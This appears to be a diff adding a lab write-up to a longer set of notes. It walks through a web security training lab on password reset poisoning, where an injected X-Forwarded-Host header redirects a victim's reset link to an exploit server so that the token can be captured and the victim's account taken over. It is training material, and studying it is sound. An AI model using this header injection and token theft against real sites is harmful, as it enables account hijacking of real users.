@@ -5765,3 +5765,359 @@ Instead of:
 * Invalidate tokens immediately after use.
 
 ---
+# Password Reset Poisoning via X-Forwarded-Host Header
+
+![lab10](images/lab11.png)
+
+## Step 1: Investigate Password Reset Functionality
+
+1. Open the login page.
+2. Click:
+
+```text
+Forgot your password?
+```
+
+3. Enter your username.
+
+Example:
+
+```text
+wiener
+```
+
+4. Submit the request.
+
+---
+
+## Step 2: Examine the Password Reset Email
+
+1. Open:
+
+```text
+Email client
+```
+
+2. Open the reset email.
+
+Observe a password reset link similar to:
+
+```text
+https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=abc123xyz
+```
+
+Notice:
+
+```text
+A unique reset token is included in the URL.
+```
+
+---
+
+# Investigate Host Header Handling
+
+## Step 3: Send Request to Repeater
+
+1. In Burp Suite, locate:
+
+```http
+POST /forgot-password
+```
+
+2. Right-click.
+3. Select:
+
+```text
+Send to Repeater
+```
+
+---
+
+## Step 4: Test X-Forwarded-Host Header
+
+Add the following header:
+
+```http
+X-Forwarded-Host: test.com
+```
+
+Observe that the application uses this value when generating password reset links.
+
+This indicates:
+
+```text
+Password reset poisoning vulnerability.
+```
+
+---
+
+# Prepare Exploit Server
+
+## Step 5: Open Exploit Server
+
+1. Click:
+
+```text
+Exploit Server
+```
+
+2. Copy the exploit server domain.
+
+Example:
+
+```text
+abcd1234.exploit-server.net
+```
+
+---
+
+# Poison Carlos's Reset Link
+
+## Step 6: Modify Repeater Request
+
+Original request:
+
+```http
+POST /forgot-password
+```
+
+Add:
+
+```http
+X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
+
+Example:
+
+```http
+X-Forwarded-Host: abcd1234.exploit-server.net
+```
+
+---
+
+## Step 7: Change Username
+
+Replace:
+
+```http
+username=wiener
+```
+
+with:
+
+```http
+username=carlos
+```
+
+---
+
+## Step 8: Send Request
+
+Click:
+
+```text
+Send
+```
+
+Result:
+
+```text
+A password reset email is generated for Carlos.
+```
+
+However the reset URL now points to:
+
+```text
+YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
+
+instead of the real application.
+
+---
+
+# Capture Carlos's Reset Token
+
+## Step 9: Open Exploit Server Access Log
+
+1. Go to:
+
+```text
+Exploit Server
+```
+
+2. Open:
+
+```text
+Access Log
+```
+
+You should see:
+
+```http
+GET /forgot-password?temp-forgot-password-token=XXXXXXXX
+```
+
+Example:
+
+```text
+temp-forgot-password-token=9xk83jfhw7a2
+```
+
+---
+
+## Step 10: Copy the Token
+
+Copy only:
+
+```text
+9xk83jfhw7a2
+```
+
+This is Carlos's valid reset token.
+
+---
+
+# Use the Stolen Token
+
+## Step 11: Obtain a Legitimate Reset Link
+
+1. Request a password reset for your own account.
+2. Open the email.
+3. Copy the legitimate reset URL.
+
+Example:
+
+```text
+https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=abcd1234
+```
+
+---
+
+## Step 12: Replace the Token
+
+Change:
+
+```text
+temp-forgot-password-token=abcd1234
+```
+
+to:
+
+```text
+temp-forgot-password-token=9xk83jfhw7a2
+```
+
+Result:
+
+```text
+https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=9xk83jfhw7a2
+```
+
+---
+
+## Step 13: Load the URL
+
+Open the modified URL in the browser.
+
+The application now accepts:
+
+```text
+Carlos's reset token.
+```
+
+---
+
+# Reset Carlos's Password
+
+## Step 14: Set New Password
+
+Example:
+
+```text
+New Password: hacked123
+Confirm Password: hacked123
+```
+
+Submit the form.
+
+---
+
+## Step 15: Password Successfully Changed
+
+Carlos's password is now:
+
+```text
+hacked123
+```
+
+(or whatever password you selected)
+
+---
+
+# Login as Carlos
+
+## Step 16: Access Carlos Account
+
+1. Open login page.
+2. Enter:
+
+```text
+Username: carlos
+Password: hacked123
+```
+
+3. Login successfully.
+
+---
+
+## Step 17: Solve the Lab
+
+1. Click:
+
+```text
+My Account
+```
+
+The lab is solved.
+
+---
+
+# Vulnerability Explanation
+
+### Normal Flow
+
+```text
+Password Reset Request
+          ↓
+Reset Link Generated
+          ↓
+Email Sent to User
+          ↓
+User Resets Password
+```
+
+### Vulnerable Flow
+
+```text
+Attacker Sets X-Forwarded-Host
+          ↓
+Reset Link Points to Attacker Server
+          ↓
+Victim Clicks Link
+          ↓
+Token Leaked
+          ↓
+Attacker Resets Victim Password
+```
+
+The application trusts:
+
+```http
+X-Forwarded-Host
+```
+
+when constructing password reset URLs.
+
+This allows attackers to steal password reset tokens.
+
+---
